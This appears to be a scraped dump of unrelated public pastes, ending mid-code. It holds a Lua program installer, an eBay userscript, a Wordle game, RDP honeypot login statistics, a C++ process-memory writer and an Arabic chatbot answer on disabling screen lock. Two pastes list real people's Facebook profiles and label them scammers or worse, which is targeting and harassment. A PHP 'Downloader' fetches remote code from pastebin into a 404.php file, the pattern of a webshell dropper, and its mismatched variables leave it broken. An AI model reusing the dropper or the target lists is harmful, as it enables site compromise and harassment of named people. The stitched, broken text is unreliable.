function getAll()
    local propFile = readString(propFilePath)
    
    --make sure the property file wasn't empty
    if(propFile == """") then return {} end

    local lines = splitStr(propFile,""\n"")

    local propTable = {}
    for i=1,#lines do
        local pair = splitStr(lines[i],"":"")
        propTable[pair[1]] = pair[2]
    end
    return propTable
end

--[[BEGIN EXECUTION]]
--get programs file
print(""Retrieving programs..."")
pull(""PropertyFiles/swarmSetup.prop"",propFilePath)

--programs will be in the format <git url>:<destination path>
local programs = getAll()
if(exists(propFilePath)) then
    print(#programs)
    --pull down all the programs into their respective folders, overwrite existing files
    for k,v in pairs(programs) do
        print(""Downloading ""..k.."" to ""..v)
        pull(k,v)
    end

    print(""Rebooting"")
    os.sleep(2)
    os.reboot()
else
    print(propFilePath.."" is missing."") 
end"
Uih4DPx6,George's Alts old bin,RebelRose,Bash,Sunday 6th of July 2025 08:45:13 PM CDT,"https://www.facebook.com/profile.php?id=61571551994266
 
https://github.com/ghoste9624/GoogleSearch
 
https://www.facebook.com/profile.php?id=61569811787633
 
https://www.facebook.com/matt.elios.9?mibextid=ZbWKwL
 
https://www.facebook.com/jk.spade?mibextid=ZbWKwL
 
https://www.facebook.com/jk.spade?mibextid=ZbWKwL
 
https://www.facebook.com/jk.spade?mibextid=ZbWKwL
 
https://www.facebook.com/ghoste.mane.9624?mibextid=ZbWKwL
 
https://www.facebook.com/jk.spade?mibextid=ZbWKwL
 
https://www.facebook.com/ghoste.mane.9624?mibextid=ZbWKwL
 
https://www.facebook.com/profile.php?id=61569349847254&mibextid=ZbWKwL
 
https://www.facebook.com/profile.php?id=61569349847254&mibextid=ZbWKwL
 
https://www.facebook.com/profile.php?id=61570772420780&mibextid=ZbWKwL
 
...........
 
New collection builds below 👇 
 
https://github.com/J4ck5pade
 
https://github.com/J4ck5pade
 
https://pastebin.com/u/Jackspade9624
 
https://github.com/ghoste9624
 
https://m.facebook.com/61572131194812
 
https://m.facebook.com/61572467794762
 
https://m.facebook.com/61571122263574
 
https://m.facebook.com/61572632986129
 
https://m.facebook.com/100006206449198
 
https://m.facebook.com/61573010045466
 
#CollectiveHacks #ScammerAlert 
#FraudAlert #NigerianScam
#killonsite #cybertooling101 
#ScammerAlert
Not #Anonymous 
#OpShotDown #OpScumBag  #NIGERIA  #ScammerAlert  #fraudsters #FraudAlert #AnonymousInternational #AnonymousGermany #ExpectUs
#CollectiveHacks 
#ScammerAlert 
#FraudAlert 
#NigerianScam 
#RomanceScam 
 
 op Spots and sources of info 🔥
Collection collecting accounts
Spade jean George shohanna 
Matt account is anon mix in.........
..............................
 
hustling out of the tool shop an anonymous Collective added to the group 
9 months ago which appears to be a clone.........
 
https://facebook.com/groups/1790610428382936/
 
https://pastebin.com/iE2sRX6c
 
https://www.facebook.com/groups/1790610428382936/permalink/1835355470575098/?mibextid=rS40aB7S9Ucbxw6v
 
New collection builds below 👇 
 
https://github.com/J4ck5pade
 
https://github.com/J4ck5pade
 
https://pastebin.com/u/Jackspade9624
 
https://github.com/ghoste9624
All dead below 👇 but elios 
 
https://m.facebook.com/61572131194812
 
https://m.facebook.com/61572467794762
 
https://m.facebook.com/61571122263574
 
https://m.facebook.com/61572632986129
 
https://m.facebook.com/100006206449198
 
https://m.facebook.com/61573010045466"
rTJdfFEv,Untitled,Ssateneth,JavaScript,Sunday 6th of July 2025 08:34:40 PM CDT,"// ==UserScript==
// @name         eBay Seller Orders - Message Buyer Shortcut
// @namespace    ebay-message-buyer
// @version      1.0
// @description  Adds a legacy ""Message Buyer"" link to each eBay order block on the seller sold orders page
// @match        https://www.ebay.com/sh/ord/*
// @match        https://www.ebay.com/sh/ord
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    function insertMessageBuyerLinks() {
        const orderRows = document.querySelectorAll(""tr[id^='orderid_']"");
        orderRows.forEach(row => {
            try {
                const itemIdElem = row.querySelector("".order-line-actions"");
                const buyerElem = row.querySelector("".buyer-modal-trigger-wrapper button span:last-child"");

                if (!itemIdElem || !buyerElem) return;

                const itemId = itemIdElem.dataset.itemid;
                const username = buyerElem.textContent.trim();

                if (!itemId || !username) return;

                const messageUrl = `https://www.ebay.com/contact/sendmsg?recipient=${encodeURIComponent(username)}&message_type_id=14&item_id=${encodeURIComponent(itemId)}`;

                // Create the link
                const link = document.createElement(""a"");
                link.href = messageUrl;
                link.textContent = ""Message Buyer"";
                link.target = ""_blank"";
                link.style.display = ""inline-block"";
                link.style.marginBottom = ""6px"";
                link.style.fontWeight = ""bold"";

                // Insert above the order-status block
                const orderStatusDiv = row.querySelector("".order-status"");
                if (orderStatusDiv) {
                    orderStatusDiv.parentNode.insertBefore(link, orderStatusDiv);
                }
            } catch (e) {
                console.error(""Message Buyer Insert Error:"", e);
            }
        });
    }

    // Run once DOM is ready
    const observer = new MutationObserver((_, obs) => {
        if (document.querySelector(""tr[id^='orderid_']"")) {
            insertMessageBuyerLinks();
            obs.disconnect();
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });
})();
"
CqRDuSDb,The Downloader,willysec_id,PHP,Sunday 6th of July 2025 08:26:57 PM CDT,"<?php
//The Downloader
$fn = __DIR__.'/404.php';
$fu = 'https://pastebin.com/raw/pH14WLTs';
if (!file_exists($filePath) || filesize($filePath) == 0) {
    if (function_exists('curl_version')) {
        $ch = curl_init($fileUrl);
        $fp = fopen($filePath, 'w');
        curl_setopt($ch, CURLOPT_FILE, $fp);
        curl_exec($ch);
        curl_close($ch);
        fclose($fp);
    } else {
        copy($fileUrl, $filePath);
    }
}
?>"
RT7Avg93,New link bin🥊,RebelRose,Bash,Sunday 6th of July 2025 07:44:20 PM CDT,"❤️ in this paste is a list of new links same old players out attacking people like always... 
Ol schools and ppl always marked.....
G23 Decoy paedo shi

https://www.facebook.com/share/16rDnJU5kS/
https://www.facebook.com/share/1Bm2wELqiw/
https://www.facebook.com/share/1AoxJD1yWv/
https://www.facebook.com/Ilikebeans001
https://www.facebook.com/bongywongy

As well as new accounts being replaced for the ones killed off, or accounts that won't go down but are being hit......

https://www.facebook.com/sharleen.angelastro.2025
https://www.facebook.com/people/Luce-Bianca/pfbid0aM8KHJ3iqExYxbXszCDSF9W2Fns5rLWWeTWaXYfNpFKSdn1pYGppQTgiPuc4ZvxXl/
https://www.facebook.com/paola.g.orfei
https://www.facebook.com/profile.php?id=100093594250843
https://www.facebook.com/paola.g.orfei
https://www.facebook.com/profile.php?id=100086023276650
https://www.facebook.com/people/Paola-Giovanna-Orfei-Due/pfbid0ywkN2N2SzqskT8sZJEXB3iWTufRisro6yZ6JGK6LE44xdQcfqSsF9PyRpPoHtdFbl/

https://www.facebook.com/profile.php?id=61564086788193
https://www.facebook.com/shane.grim.3


"
8sS3q0pg,noteScan.py,j0h,Python,Sunday 6th of July 2025 07:34:54 PM CDT,"import simpleaudio as sa
import numpy as np
# honeywell 1300g-2-06211
'''
manual: https://prod-edam.honeywell.com/content/dam/honeywell-edam/sps/ppr/ja/public/products/barcode-scanners/general-purpose-handheld/1300g/documents/sps-ppr-hp1300-ug.pdf?download=false
page 45 turns off beep sound
'''

notes = {
    ""C"": 261.63,
    ""C#"": 277.18,
    ""D"": 293.66,
    ""D#"": 311.13,
    ""E"": 329.63,
    ""F"": 349.23,
    ""F#"": 369.99,
    ""G"": 392.00,
    ""G#"": 415.30,
    ""A"": 440.00,
    ""A#"": 466.16,
    ""B"": 493.88
}

def play_note(freq, duration=0.5):
    fs = 44100  # sampling rate
    t = np.linspace(0, duration, int(fs * duration), False)
    wave = 0.5 * np.sin(2 * np.pi * freq * t)
    audio = (wave * 32767).astype(np.int16)
    sa.play_buffer(audio, 1, 2, fs).wait_done()

print(""Scan a note (C, D#, F#, etc.):"")
try:
    while True:
        scanned = input().strip().upper()
        if scanned in notes:
            #print(f""Playing {scanned}"")
            play_note(notes[scanned])
        else:
            print(f""Unknown note: {scanned}"")
except KeyboardInterrupt:
    print(""Exiting."")

''' row your boat
C   C   C   D   E
E   D   E   F   G
C   C   C   G   G
G   E   E   E   C
C   C   D   E   F
E   C   G   G   C

'''

"
Pf78XSzS,kli,rawachraf,Latex,Sunday 6th of July 2025 07:24:06 PM CDT,"ChatGPT a dit :
لمنع تسجيل الخروج التلقائي (Log Off) أو قفل الشاشة تلقائيًا (Auto Lock) في Kali Linux، إليك خطوات دقيقة بحسب بيئة سطح المكتب المستخدمة.

🎯 تحقق أولًا من بيئة سطح المكتب:
افتح الطرفية (Terminal) واكتب:

bash
Copier
Modifier
echo $XDG_CURRENT_DESKTOP
النتيجة قد تكون:
X-Cinnamon ⬅️ إذا كنت تستخدم Cinnamon

GNOME ⬅️ إذا كنت تستخدم GNOME

XFCE ⬅️ إذا كنت تستخدم XFCE

KDE ⬅️ إذا كنت تستخدم KDE Plasma

✅ حسب كل بيئة، اتبع الآتي:
🔵 1. GNOME Desktop (الأكثر شيوعًا في Kali)
📌 منع قفل الشاشة:
bash
Copier
Modifier
gsettings set org.gnome.desktop.screensaver lock-enabled false
📌 إلغاء التعتيم أو الإغلاق بعد وقت:
bash
Copier
Modifier
gsettings set org.gnome.desktop.session idle-delay 0
📌 منع تشغيل شاشة التوقف:
bash
Copier
Modifier
gsettings set org.gnome.desktop.screensaver idle-activation-enabled false
🟢 2. XFCE Desktop
📌 عبر إعدادات الواجهة:
افتح Settings Manager

اذهب إلى Power Manager

عطل خيار Put display to sleep, Switch off display, System sleep

📌 أو عبر الطرفية:
bash
Copier
Modifier
xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-battery -s 0
xfconf-query -c xfce4-power-manager -p /xfce4-power-manager/inactivity-on-ac -s 0
🟣 3. Cinnamon Desktop
افتح الإعدادات:

System Settings → Power

عطل Suspend when inactive و Turn off screen when inactive

أو عبر الطرفية:

bash
Copier
Modifier
gsettings set org.cinnamon.desktop.session idle-delay 0
gsettings set org.cinnamon.settings-daemon.plugins.power sleep-inactive-ac-type 'nothing'
🔴 4. KDE Plasma
افتح System Settings

اذهب إلى Energy Saving

عطل كل شيء في:

On Battery

Plugged In

🛠️ للحماية من الإغلاق التلقائي عند ترك الجهاز:
تشغيل أمر وهمي كل عدة دقائق:
bash
Copier
Modifier
while true; do xdotool key Shift; sleep 60; done
يتطلب تثبيت xdotool:

bash
Copier
Modifier
sudo apt install xdotool
✅ احفظ الإعداد دائمًا
بعد التعديل، أعد تشغيل الجلسة أو الجهاز لتفعيل التغييرات.

هل تريد سكربت تلقائي لتثبيت الأدوات وتعطيل القفل حسب نوع الواجهة تلقائيًا؟
أو حفظ الإعداد في boot؟
أنا جاهز أجهز لك سكربت حسب بيئتك. فقط قل لي: ما هي بيئة سطح المكتب؟ (GNOME, XFCE, Cinnamon, KDE؟)"
9AcqbrLX,wordle attempt 2 janky,rju,JavaScript,Sunday 6th of July 2025 07:18:37 PM CDT,"import React, { useEffect, useState } from 'react';
 
const WORD_LIST_API_URL = 'https://api.frontendexpert.io/api/fe/wordle-words';
const WORD_LENGTH = 5;
const NUM_ROWS = 6;
 
function WordleRow({ guess, isFinal, word }) {
  function decorateGuess(guess, isFinal, word) {
    const result = [];
    for (let i = 0; i < WORD_LENGTH; i++) {
      const tile = {};
      const char = guess[i] || '';
      tile.text = char;
      tile.class = 'tile';
      // Actually assign a subclass
      if (isFinal) {
        if (word[i] === char) {
          tile.class += ' correct';
        } else if (word.includes(char)) {
          tile.class += ' close';
        } else {
          tile.class += ' incorrect';
        }
      }
      result.push(tile);
    }
    return result;
  }
 
  // Do not use curly braces in your arrow function o/w need explicit return
  return (
    <div className=""line"">
      {decorateGuess(guess, isFinal, word).map((item, index) => 
        <div key={index} className={item.class}>{item.text}</div>
      )}
    </div>
  );
}
 
export default function Wordle() {
  // Write your code here.
  
  // Use null so we can conditionally render a default (i.e. before the API has returned)
  const [word, setWord] = useState(null); 
  const [guess, setGuess] = useState('');
  const [count, setCount] = useState(0);
  const [guesses, setGuesses] = useState([]);
  const [finished, setFinished] = useState(false);
 
  // Fetch the winning word on component mount.
  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await fetch(WORD_LIST_API_URL);
        const data = await response.json();
        const index = Math.floor(Math.random() * data.length);
        const winningWord = data[index];
        setWord(winningWord.toLowerCase());
        // For testing
        // setWord(""hello"");
      } catch (error) {
        console.error('Error fetching data:', error);
      }
    }
 
    fetchData();
  }, []); // Empty dependency array so it only runs once on mount. 
 
  // Register event listener for the keypress input
  useEffect(() => {
    const handleSubmit = () => {
      if (guess.length < WORD_LENGTH || count === NUM_ROWS || finished) {
        return;
      }
      setFinished(guess === word || count === NUM_ROWS);
      setGuesses(prevGuesses => [...prevGuesses, {guess: guess, isFinal: true}]);
      setCount(prevCount => prevCount + 1);
      setGuess('');
    }
 
    const handleBackspace = () => {
      if (guess.length === 0 || count === NUM_ROWS || finished) {
        return;
      }
      setGuess(prevGuess => prevGuess.slice(0, -1));
    }
 
    const handleCharKeyPress = (char) => {
      if (guess.length === WORD_LENGTH || count === NUM_ROWS || finished) {
        return;
      }
      setGuess(prevGuess => prevGuess + char);
    }
    
    const handleKeyPress = (event) => {
      if (finished) return;
      if (event.key === 'Enter') {
        handleSubmit();
      } else if (event.key === 'Backspace') {
        handleBackspace();
      } else { // This is bc we don't have to expect any other input besides lowercase letters. 
        handleCharKeyPress(event.key);
      }
    }

    // Very important to use window here as the test env directly dispatches events
    // to window. In a real browser, the event bubbles up from target -> document -> window
    // so it wouldn't matter if we added the listener to document or window.
    // This is why when I had document.addEventListener the code worked locally in the browser
    // but failed nearly all the unit tests. 
    window.addEventListener('keydown', handleKeyPress);
    // ALSO VERY IMPORTANT TO REMOVE THE LISTENER, O/W on each re-render
    // we add a new listener so we have 2, then 3 then 4 listeners...
    return () => window.removeEventListener('keydown', handleKeyPress);
  }, [guess, count, guesses]); // VERY IMPORTANT TO SPECIFY THE CORRECT DEPS
 
  return (
    <div className=""board"">
      {word && Array.from({ length: NUM_ROWS }).map((_, i) => 
        <WordleRow
          key={i}
          guess={count === i ? guess : guesses[i]?.guess || ''} 
          isFinal={count === i ? false : guesses[i]?.isFinal || false} 
          word={word}/>
      )}
    </div>
  );
}"
7cejGQd4,2025-07-06_stats.json,rdp_snitch,JSON,Sunday 6th of July 2025 07:18:05 PM CDT,"{
  ""ip"": {
    ""103.77.246.206"": 3,
    ""167.94.145.108"": 3,
    ""198.235.24.127"": 9,
    ""211.145.67.138"": 9,
    ""138.68.188.52"": 6,
    ""147.182.137.223"": 3,
    ""109.160.70.30"": 3,
    ""147.185.132.78"": 9,
    ""84.205.222.47"": 114,
    ""104.237.134.228"": 12,
    ""194.164.107.6"": 30,
    ""45.79.181.99"": 3,
    ""205.210.31.180"": 9,
    ""86.54.25.148"": 9,
    ""128.14.236.128"": 3,
    ""197.210.194.240"": 3,
    ""194.180.49.127"": 3,
    ""143.198.198.10"": 6,
    ""45.146.130.128"": 6,
    ""147.185.132.216"": 9
  },
  ""asn"": {
    ""AS140810"": 3,
    ""AS398705"": 3,
    ""AS396982"": 36,
    ""AS4808"": 9,
    ""AS14061"": 15,
    ""AS44247"": 3,
    ""AS35506"": 114,
    ""AS63949"": 15,
    ""AS50219"": 30,
    ""Unknown"": 9,
    ""AS135377"": 3,
    ""AS29465"": 3,
    ""AS201814"": 3,
    ""AS213790"": 6
  },
  ""isp"": {
    ""BIDATA"": 3,
    ""Censys, Inc."": 3,
    ""Google LLC"": 36,
    ""China Unicom Beijing Province Network"": 9,
    ""DigitalOcean, LLC"": 15,
    ""Videosat09 GCN"": 3,
    ""Information Society S.A."": 114,
    ""Akamai Technologies, Inc."": 15,
    ""LNK SYSTEMS MUNTENIA SRL"": 30,
    ""MISTRAL"": 9,
    ""Zenlayer Inc"": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""MEVSPACE sp. z o.o."": 3,
    ""Limited Network LTD"": 6
  },
  ""org"": {
    ""Bidata Media and Technology Joint Stock Company"": 3,
    ""Censys, Inc."": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Unicom"": 9,
    ""DigitalOcean, LLC"": 15,
    ""Unknown"": 12,
    ""Information Society S.A"": 114,
    ""Linode"": 15,
    ""Valence Technology Co"": 30,
    ""UCLOUD"": 3,
    ""MTN Nigeria"": 3,
    ""HostSlick"": 3,
    ""Limited Network LTD"": 6
  },
  ""regionName"": {
    ""B\u1eafc Ninh Province"": 3,
    ""Michigan"": 3,
    ""California"": 36,
    ""Beijing"": 9,
    ""England"": 15,
    ""New Jersey"": 6,
    ""Veliko Tarnovo"": 3,
    ""Attica"": 114,
    ""Texas"": 12,
    ""North West"": 30,
    ""Taiwan"": 3,
    ""Lagos"": 3,
    ""Bavaria"": 3,
    ""South West"": 6,
    ""Federal District"": 6
  },
  ""country"": {
    ""Vietnam"": 3,
    ""United States"": 57,
    ""China"": 9,
    ""United Kingdom"": 15,
    ""Bulgaria"": 3,
    ""Greece"": 114,
    ""Singapore"": 36,
    ""Taiwan"": 3,
    ""Nigeria"": 3,
    ""Germany"": 3,
    ""Brazil"": 6
  },
  ""account"": {
    ""hello"": 36,
    ""(empty)"": 3,
    ""YdJhNbFDW"": 3,
    ""cnvurS"": 3,
    ""QVAQhw"": 3,
    ""KuKGgWZyu"": 3,
    ""nEtLAt"": 3,
    ""HPkuTL"": 3,
    ""NCRACK_USER"": 114,
    ""jug55nhj"": 12,
    ""eltons"": 15,
    ""administr"": 15,
    ""beio"": 3,
    ""rkNocUSMr"": 3,
    ""nggAlh"": 3,
    ""mtmdwU"": 3,
    ""Domain"": 9,
    ""Administrator"": 3,
    ""Test"": 6,
    ""whTLezgbE"": 3,
    ""kicQVb"": 3,
    ""zTVJKf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 252
  },
  ""client_build"": {
    ""Unknown"": 252
  },
  ""client_name"": {
    ""Unknown"": 252
  },
  ""ip_type"": {
    ""Unknown"": 174,
    ""hosting"": 66,
    ""hosting & proxy"": 3,
    ""mobile & hosting"": 3,
    ""proxy"": 6
  }
}"
8MwwnZPp,2025-07-06_stats.json,rdp_snitch,JSON,Sunday 6th of July 2025 07:16:18 PM CDT,"{
  ""ip"": {
    ""103.77.246.206"": 2,
    ""167.94.145.108"": 2,
    ""198.235.24.127"": 6,
    ""211.145.67.138"": 6,
    ""138.68.188.52"": 4,
    ""147.182.137.223"": 2,
    ""109.160.70.30"": 2,
    ""147.185.132.78"": 6,
    ""84.205.222.47"": 76,
    ""104.237.134.228"": 8,
    ""194.164.107.6"": 20,
    ""45.79.181.99"": 2,
    ""205.210.31.180"": 6,
    ""86.54.25.148"": 6,
    ""128.14.236.128"": 2,
    ""197.210.194.240"": 2,
    ""194.180.49.127"": 2,
    ""143.198.198.10"": 4,
    ""45.146.130.128"": 4,
    ""147.185.132.216"": 6
  },
  ""asn"": {
    ""AS140810"": 2,
    ""AS398705"": 2,
    ""AS396982"": 24,
    ""AS4808"": 6,
    ""AS14061"": 10,
    ""AS44247"": 2,
    ""AS35506"": 76,
    ""AS63949"": 10,
    ""AS50219"": 20,
    ""Unknown"": 6,
    ""AS135377"": 2,
    ""AS29465"": 2,
    ""AS201814"": 2,
    ""AS213790"": 4
  },
  ""isp"": {
    ""BIDATA"": 2,
    ""Censys, Inc."": 2,
    ""Google LLC"": 24,
    ""China Unicom Beijing Province Network"": 6,
    ""DigitalOcean, LLC"": 10,
    ""Videosat09 GCN"": 2,
    ""Information Society S.A."": 76,
    ""Akamai Technologies, Inc."": 10,
    ""LNK SYSTEMS MUNTENIA SRL"": 20,
    ""MISTRAL"": 6,
    ""Zenlayer Inc"": 2,
    ""MTN NIGERIA Communication limited"": 2,
    ""MEVSPACE sp. z o.o."": 2,
    ""Limited Network LTD"": 4
  },
  ""org"": {
    ""Bidata Media and Technology Joint Stock Company"": 2,
    ""Censys, Inc."": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Unicom"": 6,
    ""DigitalOcean, LLC"": 10,
    ""Unknown"": 8,
    ""Information Society S.A"": 76,
    ""Linode"": 10,
    ""Valence Technology Co"": 20,
    ""UCLOUD"": 2,
    ""MTN Nigeria"": 2,
    ""HostSlick"": 2,
    ""Limited Network LTD"": 4
  },
  ""regionName"": {
    ""B\u1eafc Ninh Province"": 2,
    ""Michigan"": 2,
    ""California"": 24,
    ""Beijing"": 6,
    ""England"": 10,
    ""New Jersey"": 4,
    ""Veliko Tarnovo"": 2,
    ""Attica"": 76,
    ""Texas"": 8,
    ""North West"": 20,
    ""Taiwan"": 2,
    ""Lagos"": 2,
    ""Bavaria"": 2,
    ""South West"": 4,
    ""Federal District"": 4
  },
  ""country"": {
    ""Vietnam"": 2,
    ""United States"": 38,
    ""China"": 6,
    ""United Kingdom"": 10,
    ""Bulgaria"": 2,
    ""Greece"": 76,
    ""Singapore"": 24,
    ""Taiwan"": 2,
    ""Nigeria"": 2,
    ""Germany"": 2,
    ""Brazil"": 4
  },
  ""account"": {
    ""hello"": 24,
    ""(empty)"": 2,
    ""YdJhNbFDW"": 2,
    ""cnvurS"": 2,
    ""QVAQhw"": 2,
    ""KuKGgWZyu"": 2,
    ""nEtLAt"": 2,
    ""HPkuTL"": 2,
    ""NCRACK_USER"": 76,
    ""jug55nhj"": 8,
    ""eltons"": 10,
    ""administr"": 10,
    ""beio"": 2,
    ""rkNocUSMr"": 2,
    ""nggAlh"": 2,
    ""mtmdwU"": 2,
    ""Domain"": 6,
    ""Administrator"": 2,
    ""Test"": 4,
    ""whTLezgbE"": 2,
    ""kicQVb"": 2,
    ""zTVJKf"": 2
  },
  ""keyboard"": {
    ""Unknown"": 168
  },
  ""client_build"": {
    ""Unknown"": 168
  },
  ""client_name"": {
    ""Unknown"": 168
  },
  ""ip_type"": {
    ""Unknown"": 116,
    ""hosting"": 44,
    ""hosting & proxy"": 2,
    ""mobile & hosting"": 2,
    ""proxy"": 4
  }
}"
by6h73b6,2025-07-06_stats.json,rdp_snitch,JSON,Sunday 6th of July 2025 07:15:08 PM CDT,"{
  ""ip"": {
    ""103.77.246.206"": 1,
    ""167.94.145.108"": 1,
    ""198.235.24.127"": 3,
    ""211.145.67.138"": 3,
    ""138.68.188.52"": 2,
    ""147.182.137.223"": 1,
    ""109.160.70.30"": 1,
    ""147.185.132.78"": 3,
    ""84.205.222.47"": 38,
    ""104.237.134.228"": 4,
    ""194.164.107.6"": 10,
    ""45.79.181.99"": 1,
    ""205.210.31.180"": 3,
    ""86.54.25.148"": 3,
    ""128.14.236.128"": 1,
    ""197.210.194.240"": 1,
    ""194.180.49.127"": 1,
    ""143.198.198.10"": 2,
    ""45.146.130.128"": 2,
    ""147.185.132.216"": 3
  },
  ""asn"": {
    ""AS140810"": 1,
    ""AS398705"": 1,
    ""AS396982"": 12,
    ""AS4808"": 3,
    ""AS14061"": 5,
    ""AS44247"": 1,
    ""AS35506"": 38,
    ""AS63949"": 5,
    ""AS50219"": 10,
    ""Unknown"": 3,
    ""AS135377"": 1,
    ""AS29465"": 1,
    ""AS201814"": 1,
    ""AS213790"": 2
  },
  ""isp"": {
    ""BIDATA"": 1,
    ""Censys, Inc."": 1,
    ""Google LLC"": 12,
    ""China Unicom Beijing Province Network"": 3,
    ""DigitalOcean, LLC"": 5,
    ""Videosat09 GCN"": 1,
    ""Information Society S.A."": 38,
    ""Akamai Technologies, Inc."": 5,
    ""LNK SYSTEMS MUNTENIA SRL"": 10,
    ""MISTRAL"": 3,
    ""Zenlayer Inc"": 1,
    ""MTN NIGERIA Communication limited"": 1,
    ""MEVSPACE sp. z o.o."": 1,
    ""Limited Network LTD"": 2
  },
  ""org"": {
    ""Bidata Media and Technology Joint Stock Company"": 1,
    ""Censys, Inc."": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Unicom"": 3,
    ""DigitalOcean, LLC"": 5,
    ""Unknown"": 4,
    ""Information Society S.A"": 38,
    ""Linode"": 5,
    ""Valence Technology Co"": 10,
    ""UCLOUD"": 1,
    ""MTN Nigeria"": 1,
    ""HostSlick"": 1,
    ""Limited Network LTD"": 2
  },
  ""regionName"": {
    ""B\u1eafc Ninh Province"": 1,
    ""Michigan"": 1,
    ""California"": 12,
    ""Beijing"": 3,
    ""England"": 5,
    ""New Jersey"": 2,
    ""Veliko Tarnovo"": 1,
    ""Attica"": 38,
    ""Texas"": 4,
    ""North West"": 10,
    ""Taiwan"": 1,
    ""Lagos"": 1,
    ""Bavaria"": 1,
    ""South West"": 2,
    ""Federal District"": 2
  },
  ""country"": {
    ""Vietnam"": 1,
    ""United States"": 19,
    ""China"": 3,
    ""United Kingdom"": 5,
    ""Bulgaria"": 1,
    ""Greece"": 38,
    ""Singapore"": 12,
    ""Taiwan"": 1,
    ""Nigeria"": 1,
    ""Germany"": 1,
    ""Brazil"": 2
  },
  ""account"": {
    ""hello"": 12,
    ""(empty)"": 1,
    ""YdJhNbFDW"": 1,
    ""cnvurS"": 1,
    ""QVAQhw"": 1,
    ""KuKGgWZyu"": 1,
    ""nEtLAt"": 1,
    ""HPkuTL"": 1,
    ""NCRACK_USER"": 38,
    ""jug55nhj"": 4,
    ""eltons"": 5,
    ""administr"": 5,
    ""beio"": 1,
    ""rkNocUSMr"": 1,
    ""nggAlh"": 1,
    ""mtmdwU"": 1,
    ""Domain"": 3,
    ""Administrator"": 1,
    ""Test"": 2,
    ""whTLezgbE"": 1,
    ""kicQVb"": 1,
    ""zTVJKf"": 1
  },
  ""keyboard"": {
    ""Unknown"": 84
  },
  ""client_build"": {
    ""Unknown"": 84
  },
  ""client_name"": {
    ""Unknown"": 84
  },
  ""ip_type"": {
    ""Unknown"": 58,
    ""hosting"": 22,
    ""hosting & proxy"": 1,
    ""mobile & hosting"": 1,
    ""proxy"": 2
  }
}"
mAaHkHde,Untitled,badeip,C++,Sunday 6th of July 2025 05:29:39 PM CDT,"        commands_[""write""] = CommandFunc([](needle::Needle *nlp, const std::vector<std::string>& args) -> bool
        {
            if (args.size() < 3) {
                spdlog::error(""usage: write <address> [type] <value...>\n""
                                ""  address: memory address\n""
                                ""  type: data type (optional, defaults to uint8_t)\n""
                                ""  value: hex bytes for uint8_t, or value for other types"");
                return false;
            }

            uintptr_t addr = evaluate_address(*nlp, args[1]);
            size_t type_idx = 2;

            if (args.size() == 3) {
                type_idx = SIZE_MAX;
            } else {
                for (const auto& known_type : {
                    ""uint8_t"", ""uint16_t"", ""uint32_t"", ""uint64_t"", ""int8_t"", ""int16_t"", ""int32_t"", ""int64_t"", ""float"", ""double"", ""string""
                }) {
                    if (args[2] == known_type) {
                        type_idx = 2;
                        break;
                    }
                }
                if (type_idx == 2 && args.size() > 4) {
                    type_idx = SIZE_MAX;
                }
            }

            const auto type = (type_idx == SIZE_MAX) ? ""uint8_t"" : args[type_idx];

            if (type == ""uint8_t"") {
                std::vector<uint8_t> bytes;
                size_t start_idx = (type_idx == SIZE_MAX) ? 2 : type_idx + 1;

                for (size_t i = start_idx; i < args.size(); ++i) {
                    try {
                        unsigned long byte_val = std::stoul(args[i], nullptr, 16);
                        if (byte_val > 0xFF) {
                            spdlog::error(""Byte value out of range: {}"", args[i]);
                            return false;
                        }
                        bytes.push_back(static_cast<uint8_t>(byte_val));
                    } catch (...) {
                        spdlog::error(""Invalid hex byte: {}"", args[i]);
                        return false;
                    }
                }

                spdlog::info(""write: {:#x} = (uint8_t[{}]) [{}]"", addr, bytes.size(),
                    fmt::format(""{:#04x}"", fmt::join(bytes, "" "")));

                if (!compat::write_mem(nlp->proc.handle, addr, bytes)) {
                    spdlog::error(""WriteProcessMemory({:#x}), failed: {}"", addr, GetLastError());
                    return false;
                }
                spdlog::info(""Write succeeded"");
                return true;
            }

            std::string val = args[type_idx + 1];
            if (args.size() > type_idx + 2) {
                val.clear();
                for (size_t i = type_idx + 1; i < args.size(); ++i) {
                    if (i > type_idx + 1) val += "" "";
                    val += args[i];
                }
            }

            mem::ValueVariant value;
            try {
                value = mem::parse_argument(val, type);
            } catch (const std::exception& e) {
                spdlog::error(""Error parsing value: {}"", e.what());
                return false;
            }

            std::visit([&](const auto& tp) {
                if constexpr (std::is_same_v<std::decay_t<decltype(tp)>, std::string>) {
                    spdlog::info(""write: {:#014x} = (std::string) \""{}\"""", addr, tp);
                } else if constexpr (std::is_integral_v<std::decay_t<decltype(tp)>>) {
                    spdlog::info(""write: {:#014x} = ({}) {:#x}"", addr, type, tp);
                } else {
                    spdlog::info(""write: {:#014x} = ({}) {}"", addr, type, tp);
                }
            }, value);

            if (!mem::write_value(nlp->proc.handle, value, addr)) {
                spdlog::error(""Write failed: {}"", GetLastError());
                return false;
            }
            spdlog::info(""Write succeeded"");
            return true;
        });        commands_[""write""] = CommandFunc([](needle::Needle *nlp, const std::vector<std::string>& args) -> bool
        {
            if (args.size() < 3) {
                spdlog::error(""usage: write <address> [type] <value...>\n""
                                ""  address: memory address\n""
                                ""  type: data type (optional, defaults to uint8_t)\n""
                                ""  value: hex bytes for uint8_t, or value for other types"");
                return false;
            }

            uintptr_t addr = evaluate_address(*nlp, args[1]);
            size_t type_idx = 2;

            if (args.size() == 3) {
                type_idx = SIZE_MAX;
            } else {
                for (const auto& known_type : {
                    ""uint8_t"", ""uint16_t"", ""uint32_t"", ""uint64_t"", ""int8_t"", ""int16_t"", ""int32_t"", ""int64_t"", ""float"", ""double"", ""string""
                }) {
                    if (args[2] == known_type) {
                        type_idx = 2;
                        break;
                    }
                }
                if (type_idx == 2 && args.size() > 4) {
                    type_idx = SIZE_MAX;
                }
            }

            const auto type = (type_idx == SIZE_MAX) ? ""uint8_t"" : args[type_idx];

            if (type == ""uint8_t"") {
                std::vector<uint8_t> bytes;
                size_t start_idx = (type_idx == SIZE_MAX) ? 2 : type_idx + 1;

                for (size_t i = start_idx; i < args.size(); ++i) {
                    try {
                        unsigned long byte_val = std::stoul(args[i], nullptr, 16);
